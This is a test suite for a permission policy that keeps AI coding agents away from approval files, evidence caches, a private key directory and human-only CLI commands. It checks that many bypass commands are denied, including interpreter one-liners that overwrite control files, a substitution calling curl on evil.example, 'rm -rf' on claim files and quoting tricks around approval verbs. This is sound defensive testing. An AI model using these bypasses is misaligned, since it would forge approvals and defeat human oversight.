import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import path from "node:path"
import {
  controlClass,
  evaluateRead,
  evaluateShell,
  evaluateWrite,
  HUMAN_VERBS,
  invokesHumanOnly,
  rebaseline,
  verifyControl,
} from "../src/trust/index.ts"
import { BOOLEAN_FLAGS, parseArgs } from "../src/util/args.ts"

let root: string
let state: string
let worktree: string

beforeAll(async () => {
  root = await mkdtemp(path.join(tmpdir(), "es-policy-"))
  state = await mkdtemp(path.join(tmpdir(), "es-state-"))
  worktree = path.join(root, ".factory/worktrees/p1")
  await mkdir(path.join(worktree, "src"), { recursive: true })
  await mkdir(path.join(root, ".factory/approvals"), { recursive: true })
  await mkdir(path.join(root, "src"), { recursive: true })
})
afterAll(async () => {
  await rm(root, { recursive: true, force: true })
  await rm(state, { recursive: true, force: true })
})

const ctx = () => ({ root, worktree, stateDir: state })
const effect = (decision: { effect: string }) => decision.effect

describe("control classification", () => {
  test.each([
    [".factory/gates.json", "factory"],
    [".factory/approvals/spec.json", "factory"],
    [".factory/runtime/audit.jsonl", "factory"],
    [".factory/worktrees/p1/.factory/approvals/spec.json", "factory"],
    [".git/hooks/pre-commit", "factory"],
    [`.factory/research/sources/${"a".repeat(64)}.md`, "factory"],
    [".factory/research/sources/index.json", "factory"],
    [".factory/research/coverage.json", "factory"],
    [".factory/research/dossier.json", "factory"],
    [".factory/research/brief.pcrb.json", "factory"],
    [".factory/claims/retractions.json", "factory"],
    [".factory/research/REPORT.md", undefined],
    [".factory/research/notes.md", undefined],
    ["opencode.jsonc", "config"],
    [".claude/settings.json", "config"],
    [".factory/specs/p1/GOAL.md", undefined],
    ["src/index.ts", undefined],
    // #45: case variants name the same file on case-insensitive volumes.
    [".factory/GATES.json", "factory"],
    [".FACTORY/approvals/spec.json", "factory"],
    [".factory/research/SOURCES/abc.md", "factory"],
    [".factory/research/Dossier.json", "factory"],
    ["OpenCode.json", "config"],
  ])("%s → %s", (file, expected) => expect(controlClass(file)).toBe(expected as any))
})

describe("write policy", () => {
  test("control files are denied for every agent, including absolute and dot-dot paths", () => {
    for (const agent of [undefined, "build", "factory", "es-programmer", "es-manager"]) {
      expect(effect(evaluateWrite(ctx(), agent, ".factory/approvals/spec.json"))).toBe("deny")
      expect(effect(evaluateWrite(ctx(), agent, path.join(root, ".factory/approvals/spec.json")))).toBe("deny")
      expect(effect(evaluateWrite(ctx(), agent, "docs/../.factory/gates.json"))).toBe("deny")
    }
  })

  test("the project config is a control file for every agent, in the editor and the shell", () => {
    for (const agent of [undefined, "build", "factory", "es-manager", "harvester"])
      expect(effect(evaluateWrite(ctx(), agent, ".factory/config.json"))).toBe("deny")
    const shell = evaluateShell(ctx(), undefined, `echo '{}' > .factory/config.json`, { sandboxAvailable: false })
    expect(shell.effect).toBe("deny")
  })

  test("engine-owned brainstorm/harvest/design state is tool-only; seats keep notes", () => {
    const engine = [
      ".factory/harvest/matrix.json",
      ".factory/harvest/plan.json",
      ".factory/harvest/widget/profile.json",
      ".factory/harvest/VENDOR-PLAN.md",
      ".factory/harvest/clean-room/widget-search.md",
      ".factory/harvest/runs/grill-1/plan.json",
      ".factory/harvest/runs/grill-1/widget/profile.json",
      ".factory/harvest/runs/grill-1/HARVEST.md",
      ".factory/brainstorm/scores.json",
      ".factory/brainstorm/ideas.json",
      ".factory/brainstorm/runs/grill-1/plan.json",
      ".factory/brainstorm/runs/grill-1/ideas.json",
      ".factory/brainstorm/runs/grill-1/BRAINSTORM.md",
      ".factory/design/tokens.json",
      ".factory/design/STYLE_GUIDE.md",
    ]
    for (const agent of [undefined, "build", "factory", "harvester", "brainstormer", "designer", "es-manager"])
      for (const file of engine)
        expect([agent, file, effect(evaluateWrite(ctx(), agent, file))]).toEqual([agent, file, "deny"])
    expect(effect(evaluateWrite(ctx(), "harvester", ".factory/harvest/notes/teardown.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "brainstormer", ".factory/brainstorm/notes/x.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "designer", ".factory/design/notes/x.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "harvester", ".factory/brainstorm/notes/x.md"))).toBe("deny")
  })

  test("cached evidence is tool-only: no agent can forge a source, coverage, dossier or retraction", () => {
    // A source file is named by its own sha256, so a hand-written one would
    // pass the cache's tamper check by construction. Only core writes these.
    const evidence = [
      `.factory/research/sources/${"b".repeat(64)}.md`,
      `.factory/research/sources/${"b".repeat(64)}.json`,
      ".factory/research/sources/index.json",
      ".factory/research/coverage.json",
      ".factory/research/dossier.json",
      ".factory/research/brief.pcrb.json",
      ".factory/claims/retractions.json",
    ]
    for (const agent of [undefined, "build", "factory", "es-research-alpha", "es-research-beta", "es-manager"])
      for (const file of evidence)
        expect([agent, file, effect(evaluateWrite(ctx(), agent, file))]).toEqual([agent, file, "deny"])
    expect(effect(evaluateWrite(ctx(), "factory", ".factory/research/REPORT.md"))).toBe("allow")
  })

  test("one writer per research file: alpha its notes, beta its notes, the factory the report (#60)", () => {
    const owner: Record<string, string> = {
      ".factory/research/alpha.md": "es-research-alpha",
      ".factory/research/beta.md": "es-research-beta",
      ".factory/research/REPORT.md": "factory",
    }
    for (const [file, writer] of Object.entries(owner))
      for (const agent of ["es-research-alpha", "es-research-beta", "factory"])
        expect([file, agent, effect(evaluateWrite(ctx(), agent, file))]).toEqual([
          file,
          agent,
          agent === writer ? "allow" : "deny",
        ])
    // Seats keep no other files under research/.
    expect(effect(evaluateWrite(ctx(), "es-research-alpha", ".factory/research/notes.md"))).toBe("deny")
  })

  test("research runs: the synthesizer alone writes the report, the coordinator plans in notes/ (#111)", () => {
    // The factory keeps its build-run grant; the mode split is enforced by who
    // launches the synthesizer (only the deep-researcher, only in research runs).
    expect(effect(evaluateWrite(ctx(), "factory", ".factory/research/REPORT.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "deep-researcher", ".factory/research/REPORT.md"))).toBe("deny")
    expect(effect(evaluateWrite(ctx(), "es-research-synthesizer", ".factory/research/REPORT.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "es-research-synthesizer", ".factory/research/alpha.md"))).toBe("deny")
    expect(effect(evaluateWrite(ctx(), "deep-researcher", ".factory/research/notes/plan.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "deep-researcher", ".factory/research/REPORT.md"))).toBe("deny")
    expect(effect(evaluateWrite(ctx(), "es-research-alpha", ".factory/research/notes/plan.md"))).toBe("deny")
  })

  test("manager cannot escape docs/ with ..", () => {
    expect(effect(evaluateWrite(ctx(), "es-manager", "docs/../src/x.ts"))).toBe("deny")
    expect(effect(evaluateWrite(ctx(), "es-manager", "docs/arch.md"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "es-manager", ".factory/specs/p1/GOAL.md"))).toBe("allow")
  })

  test("programmer writes only inside its phase worktree, never its .factory or .git", () => {
    expect(effect(evaluateWrite(ctx(), "es-programmer", path.join(worktree, "src/a.ts")))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "es-programmer", "src/a.ts"))).toBe("deny")
    expect(effect(evaluateWrite(ctx(), "es-programmer", path.join(worktree, ".factory/specs/p1/GOAL.md")))).toBe("deny")
    expect(effect(evaluateWrite({ root, stateDir: state }, "es-programmer", path.join(worktree, "src/a.ts")))).toBe(
      "deny",
    )
  })

  test("QA seats are read-only", () => {
    expect(effect(evaluateWrite(ctx(), "es-qa-functional", path.join(worktree, "src/a.ts")))).toBe("deny")
    expect(effect(evaluateWrite(ctx(), "es-qa-adversarial", "README.md"))).toBe("deny")
  })

  test("non-seat agents keep host semantics but must ask for config controls", () => {
    expect(effect(evaluateWrite(ctx(), "build", "src/a.ts"))).toBe("allow")
    expect(effect(evaluateWrite(ctx(), "build", "opencode.jsonc"))).toBe("ask")
    expect(effect(evaluateWrite(ctx(), "es-manager", "opencode.jsonc"))).toBe("deny")
  })

  test("a symlink into .factory cannot be used to write a control file", async () => {
    await writeFile(path.join(root, ".factory/approvals/spec.json"), "{}")
    await symlink(path.join(root, ".factory/approvals"), path.join(root, "src/link"))
    expect(effect(evaluateWrite(ctx(), "build", "src/link/spec.json"))).toBe("deny")
  })

  test("the private state dir is off limits for reads and writes", () => {
    expect(effect(evaluateWrite(ctx(), "build", path.join(state, "key")))).toBe("deny")
    expect(effect(evaluateRead(ctx(), "build", path.join(state, "trust.json")))).toBe("deny")
    expect(effect(evaluateRead(ctx(), "build", "src/a.ts"))).toBe("allow")
  })
})

describe("shell policy", () => {
  const shell = (agent: string | undefined, command: string, sandboxAvailable = true) =>
    evaluateShell(ctx(), agent, command, { sandboxAvailable })

  test("a plain `es <human verb> --help` is allowed for every agent: the CLI prints usage first (#59)", () => {
    for (const command of [
      "es reseal --help",
      "es approve frontier --help",
      "es factory --help",
      "es audit --help",
      "es --cwd . key seal --help",
    ])
      for (const agent of ["build", "factory", "es-research-alpha"])
        expect([agent, command, shell(agent, command).effect]).toEqual([agent, command, "allow"])
    // Anything that could run the verb for real stays human-only.
    for (const command of [
      "es approve --help; es approve frontier",
      "es approve --help && es approve frontier",
      "es approve frontier -- --help",
      "es approve frontier --help=no",
      'sh -c "es approve frontier" --help',
      "env X=1 es approve frontier --help",
      "es approve frontier $(echo --help)",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: a literal shell parameter expansion
      "es approve frontier ${X:---help}",
      "es approve frontier `true` --help",
      "es approve frontier --help | cat",
      "es approve \\\nfrontier --help; true",
    ])
      expect([command, shell("build", command).effect]).toEqual([command, "deny"])
  })

  test("human-only CLIs are denied for every agent, however they are quoted or wrapped", () => {
    expect(shell("build", "es approve spec").effect).toBe("deny")
    expect(shell(undefined, "cd x && epistemic-swarm waive lint/check").effect).toBe("deny")
    expect(shell("build", "es config set models.deep x/y").effect).toBe("deny")
    expect(shell("factory", `es research retract ${"c".repeat(64)} --event retracted`).effect).toBe("deny")
    expect(shell("build", "es config show").effect).toBe("allow")
    // Audit and scout runs drive a harness CLI: never from an agent's shell.
    expect(shell("build", "es audit src --max-usd 5").effect).toBe("deny")
    expect(shell("factory", "es audit ./src").effect).toBe("deny")
    expect(shell("build", 'es scout "a parser"').effect).toBe("deny")
    expect(shell("build", "es audit dismiss audit-01 --reason x").effect).toBe("deny")
    expect(shell("build", "es audit verify").effect).toBe("allow")
    expect(shell("build", "es audit show").effect).toBe("allow")
    expect(shell("build", "es scout show").effect).toBe("allow")
    // Deep-research runs drive a harness CLI too: human-only, like audit/scout.
    expect(shell("build", "es research deep 'what queue' --output /tmp/r --max-usd 5").effect).toBe("deny")
    expect(shell("factory", "es research deep 'what queue' --output /tmp/r --max-usd 5").effect).toBe("deny")
    expect(shell("build", "es research search x").effect).toBe("allow")
    // Rendering signs nothing: any seat may render, but export/retract stay human-only.
    expect(shell("build", "es research render --format html").effect).toBe("allow")
    expect(shell("factory", "es research render --format md --out /tmp/r.md").effect).toBe("allow")
    // The 1.1.0 audit (#44, #39): quoting, package runners and interpreters.
    for (const command of [
      "es 'approve' spec",
      "es 'audit' src",
      "es 'scout' leftpad",
      "npx -y @heretek-ai/es-cli audit src --max-usd 5",
      "bunx @heretek-ai/es-cli@1.1.0 approve frontier",
      "node ./node_modules/@heretek-ai/es-cli/bin/es.js trust",
      `bun -e "Bun.spawn(['es','approve','spec'])"`,
      "es key seal",
      "es reseal",
      "es reseal --sign",
    ])
      expect([command, shell("build", command).effect]).toEqual([command, "deny"])
  })

  test("a flag or `--` before the verb still reads as that verb, as the CLI parser does (#88)", () => {
    for (const command of [
      "es --cwd . approve spec",
      "es --cwd=. approve spec",
      "es -- approve spec",
      "es --json approve spec",
      "es --cwd . reseal --sign",
      "es --cwd . --json key seal",
      "es --run run-1 factory resume",
      "es factory --cwd . resume",
      "es gates --cwd=. install-git",
      "es --cwd . audit src --max-usd 5",
      "es --cwd . config set models.deep x/y",
      "es --cwd . research deep 'what queue' --output /tmp/r --max-usd 5",
      "es research --output /tmp/r deep 'what queue' --max-usd 5",
      "npx @heretek-ai/es-cli --cwd . approve spec",
    ])
      for (const agent of ["build", "es-programmer"])
        expect([agent, command, shell(agent, command).effect]).toEqual([agent, command, "deny"])
    // Reads keep working with flags around them.
    for (const command of [
      "es --cwd . status",
      "es --run run-1 status",
      "es --cwd . config show",
      "es --cwd . audit verify",
      "es --cwd . factory status",
    ])
      expect([command, shell("build", command).effect]).toEqual([command, "allow"])
  })

  test("a boolean flag with an inline value still reads as that verb (--bool=value, #97)", () => {
    for (const command of [
      "es --json=1 config set models.deep x/y",
      "es --json=x approve frontier",
      "es --json=1 trust",
      "es --json=x waive lint/check --reason y",
      "es --json=1 audit src --max-usd 5",
      'es --json=1 scout "a parser"',
      "es --json=1 reseal --sign",
      "es --cwd=. --json=x approve frontier",
    ])
      for (const agent of ["build", "es-programmer"])
        expect([agent, command, shell(agent, command).effect]).toEqual([agent, command, "deny"])
    // Reads keep working with an inline boolean value.
    for (const command of ["es --json=1 status", "es --json=x config show", "es --json=1 audit verify"])
      expect([command, shell("build", command).effect]).toEqual([command, "allow"])
  })

  test("a verb only mentioned in text is still denied, and the refusal points at passing the text by file (#86)", () => {
    const hint = /--body-file/
    const reason = (decision: ReturnType<typeof shell>) => (decision.effect === "deny" ? decision.reason : "")
    for (const command of [
      "gh issue comment 1 --body \"$(cat <<'EOF'\nrun es approve spec in a terminal\nEOF\n)\"",
      "gh issue comment 1 --body-file - <<'EOF'\nes approve spec\nEOF",
      'git commit -m "docs: es reseal --sign re-signs the state"',
    ]) {
      const decision = shell("build", command)
      expect([command, decision.effect]).toEqual([command, "deny"])
      expect([command, reason(decision)]).toEqual([command, expect.stringMatching(hint)])
    }
    // A plain call gets the plain refusal.
    for (const command of ["es approve spec", "cd x && es --cwd . reseal --sign"])
      expect([command, reason(shell("build", command))]).toEqual([command, expect.not.stringMatching(hint)])
  })

  test("seats may not reach the evidence cache from the shell; others may read but not mutate it", () => {
    expect(shell("es-research-alpha", "cat .factory/research/sources/index.json").effect).toBe("deny")
    expect(shell("build", "cat .factory/research/sources/index.json").effect).toBe("allow")
    expect(shell("build", "echo x > .factory/research/sources/index.json").effect).toBe("deny")
    expect(shell("build", "rm -rf .factory/claims").effect).toBe("deny")
  })

  test("mutating control files from the shell is denied; seats may not mention them at all", () => {
    expect(shell("build", "echo {} > .factory/approvals/spec.json").effect).toBe("deny")
    expect(shell("build", "cat .factory/gates.json").effect).toBe("allow")
    expect(shell("es-programmer", "cat .factory/gates.json").effect).toBe("deny")
  })

  test("a .factory mention is read-only-gated for the user's agents: the audit's bypasses are refused", () => {
    // A3 (1.1.0): interpreter one-liners.
    expect(shell("build", `python3 -c 'open(".factory/gates.json","w").write("pwned")'`).effect).toBe("deny")
    expect(
      shell("build", `node -e 'require("fs").writeFileSync(".factory/research/sources/x.md","forged")'`).effect,
    ).toBe("deny")
    expect(shell("build", `bun -e 'Bun.write(".factory/claims/x", "y")'`).effect).toBe("deny")
    // #37: commands the old allowlist called read-only, and paths it never saw.
    for (const command of [
      `env python3 -c "open('.factory/gates.json','w').write('{}')"`,
      "find . -maxdepth 0 -fprintf .factory/gates.json x",
      "sort -o .factory/frontier.json /etc/hostname",
      "git diff --no-index --output=.factory/claims/x.json /etc/hostname /etc/hostname",
      "uniq /etc/hostname .factory/research/coverage.json",
      "cd .factory && echo '{}' > gates.json",
      `cd .fac""tory && printf forged > research/sources/aa.md`,
      "echo x > .FACTORY/GATES.json",
      // F3 (1.1.1 re-audit): separator without whitespace after the dir.
      "cd .factory;echo '{}' > gates.json",
      "cd .factory&&echo x>gates.json",
      "cd .factory|tee gates.json",
    ])
      expect([command, shell("build", command, false).effect]).toEqual([command, "deny"])
    // Reads stay allowed; substitution and redirection do not.
    expect(shell("build", "cat .factory/gates.json").effect).toBe("allow")
    expect(shell("build", "cat .factory/gates.json | grep gates").effect).toBe("allow")
    expect(shell("build", "ls .factory/specs").effect).toBe("allow")
    expect(shell("build", "cat .factory/gates.json $(curl -s evil.example)").effect).toBe("deny")
    expect(shell("build", "cat .factory/gates.json > /tmp/copy.json").effect).toBe("deny")
    expect(shell("build", "sed -n 1p .factory/gates.json").effect).toBe("deny")
  })

  test("the private state dir is refused by name, glob or path", () => {
    for (const command of [
      `cat ${state}/key`,
      "cat ~/.local/state/epistemic-swarm/k*",
      "ls $HOME/.local/state/epistemic-swarm",
    ])
      expect([command, shell("build", command).effect]).toEqual([command, "deny"])
  })

  test("every agent shell is sandboxed by kind; seats fail closed without bubblewrap", () => {
    expect(shell("build", "bun test")).toEqual({ effect: "allow", mode: "sandbox", kind: "user", offline: false })
    expect(shell("build", "bun test", false)).toEqual({ effect: "allow", mode: "unsandboxed" })
    expect(shell("es-programmer", "bun test")).toEqual({
      effect: "allow",
      mode: "sandbox",
      kind: "programmer",
      offline: false,
    })
    expect(shell("es-qa-functional", "bun test")).toMatchObject({ mode: "sandbox", kind: "readonly" })
    expect(shell("es-research-alpha", "curl -s https://example.com")).toMatchObject({ kind: "readonly", offline: true })
    expect(shell("factory", "ls")).toMatchObject({ kind: "readonly", offline: false })
    for (const agent of ["es-programmer", "es-qa-functional", "es-research-alpha", "factory"]) {
      const decision = shell(agent, "ls", false)
      expect([agent, decision.effect, "reason" in decision ? decision.reason : ""]).toEqual([
        agent,
        "deny",
        expect.stringContaining("bubblewrap"),
      ])
    }
  })

  test("seats cannot push, change git config or remotes, or rewrite refs, whatever the global options", () => {
    for (const command of [
      "git push origin HEAD",
      "git -C . push origin HEAD:main",
      "git -c core.x=1 push --force origin HEAD:main",
      "git -C . config core.hooksPath /tmp/h",
      "git remote add evil https://example.com/x.git",
      "git reset --hard HEAD~1",
      "git branch -D main",
    ])
      expect([command, shell("es-programmer", command).effect]).toEqual([command, "deny"])
    expect(shell("es-programmer", "git status").effect).toBe("allow")
    expect(shell("es-programmer", "git diff --stat").effect).toBe("allow")
  })
})

describe("control baseline", () => {
  test("drift in a pinned control file is reported", async () => {
    await writeFile(path.join(root, ".factory/gates.json"), "{}")
    await rebaseline(root, "test")
    expect((await verifyControl(root)).clean).toBe(true)
    await writeFile(path.join(root, ".factory/gates.json"), '{"commands":{}}')
    const check = await verifyControl(root)
    expect(check.clean).toBe(false)
    expect(check.violations[0]).toContain(".factory/gates.json changed")
    await writeFile(path.join(root, ".factory/approvals/forged.json"), "{}")
    expect((await verifyControl(root)).violations.join("\n")).toContain("forged.json appeared")
  })

  test("the project config is pinned: appearing or changing outside a human action is drift", async () => {
    await rm(path.join(root, ".factory/approvals/forged.json"), { force: true })
    await rebaseline(root, "test")
    await writeFile(path.join(root, ".factory/config.json"), '{"afterEdit":"off"}')
    expect((await verifyControl(root)).violations.join("\n")).toContain(".factory/config.json appeared")
    await rebaseline(root, "test")
    await writeFile(path.join(root, ".factory/config.json"), '{"afterEdit":"fast"}')
    expect((await verifyControl(root)).violations.join("\n")).toContain(".factory/config.json changed")
  })
})

// ------------------------------------------------------------------ argv parity (#97)
//
// One grammar for the CLI and the human-only rule. The CLI dispatches on
// parseArgs(argv, BOOLEAN_FLAGS).positionals; the shell policy reads the same
// words quote-blind. This property pins the denial direction: whatever argv
// the CLI would dispatch to a human-only verb, the policy must deny.

/** Deterministic PRNG (mulberry32): the seed prints on failure, no dependency. */
const mulberry32 = (seed: number) => () => {
  seed |= 0
  seed = (seed + 0x6d2b79f5) | 0
  let t = Math.imul(seed ^ (seed >>> 15), 1 | seed)
  t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
  return ((t ^ (t >>> 14)) >>> 0) / 4294967296
}

const BINARIES: readonly string[][] = [
  ["es"],
  ["epistemic-swarm"],
  ["npx", "@heretek-ai/es-cli"],
  ["bunx", "@heretek-ai/es-cli@1.1.4"],
  ["node", "./bin/es.js"],
]
const GLOBAL_FLAGS: readonly string[][] = [
  ["--cwd", "."],
  ["--run", "r1"],
  ["--json"],
  ["--json=1"],
  ["--json=x"],
  ["--full=yes"],
  ["--x=y"],
  ["--"],
  ["--cwd=."],
  ["--verbose"],
  ["--tag", "v1"],
]
const TRAILING: readonly string[] = [
  "x",
  "frontier",
  "spec",
  "--max-usd",
  "5",
  "models.deep",
  "lint/check",
  "audit-01",
  "--reason",
  "why",
  "extra",
  "--force",
]
/** Sub-verbs per HUMAN_VERBS entry: [satisfying..., failing...]. */
const SUBS: Readonly<Record<string, readonly [readonly string[], readonly string[]]>> = {
  factory: [
    ["resume", "pr"],
    ["begin", "run", "stop", "status"],
  ],
  gates: [["install-git"], ["run"]],
  lsp: [["install"], ["status", "diagnostics"]],
  config: [["set"], ["show"]],
  research: [
    ["retract", "export"],
    ["search", "fetch", "audit", "verify-brief"],
  ],
  audit: [
    ["src", "dismiss", "./src", "audit-01"],
    ["verify", "show"],
  ],
  scout: [["leftpad"], ["show"]],
}

describe("argv parity: the policy denies whatever the CLI would run as human-only (#97)", () => {
  for (const seed of [20261008, 97, 881]) {
    test(`seed ${seed}: 2,000 generated argv, zero missed denials`, () => {
      const rand = mulberry32(seed)
      const pick = <T>(items: readonly T[]): T => items[Math.floor(rand() * items.length)]!
      const missed: string[] = []
      for (let i = 0; i < 2000; i++) {
        const binary = pick(BINARIES)
        const pre = Array.from({ length: Math.floor(rand() * 4) }, () => pick(GLOBAL_FLAGS)).flat()
        const [verb] = pick(HUMAN_VERBS)
        const subs = SUBS[verb!]
        // Bare verbs, satisfying and failing sub-verbs all occur; flags may
        // sit between the verb and its sub-verb (the #88 shape).
        const mid = Array.from({ length: Math.floor(rand() * 3) }, () => pick(GLOBAL_FLAGS)).flat()
        const roll = rand()
        const sub =
          subs === undefined
            ? roll < 0.5
              ? [pick(TRAILING)]
              : []
            : roll < 0.4
              ? [pick(subs[0])]
              : roll < 0.7
                ? [pick(subs[1])]
                : []
        const trailing = Array.from({ length: Math.floor(rand() * 4) }, () => pick(TRAILING))
        const rest = [...pre, verb!, ...mid, ...sub, ...trailing]
        const [command, next] = parseArgs(rest, BOOLEAN_FLAGS).positionals
        const rule = HUMAN_VERBS.find(([name]) => name === command)
        const humanOnly = rule !== undefined && (rule[1] === undefined || rule[1](next))
        if (humanOnly && !invokesHumanOnly([...binary, ...rest].join(" ")))
          missed.push(`case ${i}: ${[...binary, ...rest].join(" ")}`)
        if (missed.length > 4) break
      }
      expect(missed).toEqual([])
    })
  }
})
